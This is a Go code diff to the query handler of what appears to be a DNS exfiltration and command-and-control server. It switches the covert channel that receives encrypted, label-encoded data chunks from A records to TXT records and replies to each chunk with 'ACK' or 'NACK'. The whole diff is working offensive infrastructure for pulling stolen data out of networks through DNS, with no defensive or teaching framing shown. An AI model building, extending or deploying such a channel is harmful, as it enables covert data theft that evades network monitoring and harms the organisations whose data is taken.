@@ -258,10 +258,11 @@ func handleQuery(packet []byte, cfg Config, clientIP string) ([]byte, error) {
 	q := msg.Questions[0]
 
 	// Detect dedicated exfil client traffic first (label framing or legacy EDNS metadata)
-	if q.Type == 1 {
+	// TXT EXFIL: Now uses TXT records (type 16) with "ACK" response instead of A records
+	if q.Type == 16 {
 		domainHints := buildExfilDomainHints(cfg.Domain, c2Manager.GetKnownDomains())
 		if debugMode {
-			logf("[Exfil] Checking query: %s against domain hints: %v", q.Name, domainHints)
+			logf("[Exfil] Checking TXT query: %s against domain hints: %v", q.Name, domainHints)
 		}
 		if frame, matched, frameErr := parseLabelEncodedExfilFrame(q.Name, domainHints, c2Manager.GetEncryptionKey()); matched {
 			ack := false
@@ -279,14 +280,20 @@ func handleQuery(packet []byte, cfg Config, clientIP string) ([]byte, error) {
 			// Log ACK decision for debugging
 			willAck := err == nil && ack
 			if debugMode {
-				logf("[Exfil] ACK decision: willAck=%v, err=%v, ack=%v, svrAddr=%s", willAck, err, ack, cfg.SvrAddr)
+				logf("[Exfil] ACK decision: willAck=%v, err=%v, ack=%v", willAck, err, ack)
+			}
+			// TXT EXFIL: Respond with TXT "ACK" on success, "NACK" on failure
+			txtResponse := "NACK"
+			if willAck {
+				txtResponse = "ACK"
 			}
 			answers := []DNSResourceRecord{{
-				Name:  q.Name,
-				Type:  1,
-				Class: 1,
-				TTL:   1,
-				RData: ackIPAddress(cfg.SvrAddr, willAck),
+				Name:     q.Name,
+				Type:     16, // TXT record
+				Class:    1,
+				TTL:      1,
+				RDLength: uint16(len(txtResponse) + 1),
+				RData:    buildTXTRData(txtResponse),
 			}}
 			respMsg := buildResponse(msg, answers, 0)
 			return serializeMessage(respMsg), nil
@@ -312,12 +319,18 @@ func handleQuery(packet []byte, cfg Config, clientIP string) ([]byte, error) {
 					logf("[Exfil] Chunk processing error: %v", err)
 				}
 			}
+			// TXT EXFIL: Respond with TXT "ACK" on success, "NACK" on failure
+			txtResponse := "NACK"
+			if ack {
+				txtResponse = "ACK"
+			}
 			answers := []DNSResourceRecord{{
-				Name:  q.Name,
-				Type:  1,
-				Class: 1,
-				TTL:   1,
-				RData: ackIPAddress(cfg.SvrAddr, ack),
+				Name:     q.Name,
+				Type:     16, // TXT record
+				Class:    1,
+				TTL:      1,
+				RDLength: uint16(len(txtResponse) + 1),
+				RData:    buildTXTRData(txtResponse),
 			}}
 			respMsg := buildResponse(msg, answers, 0)
 			return serializeMessage(respMsg), nil
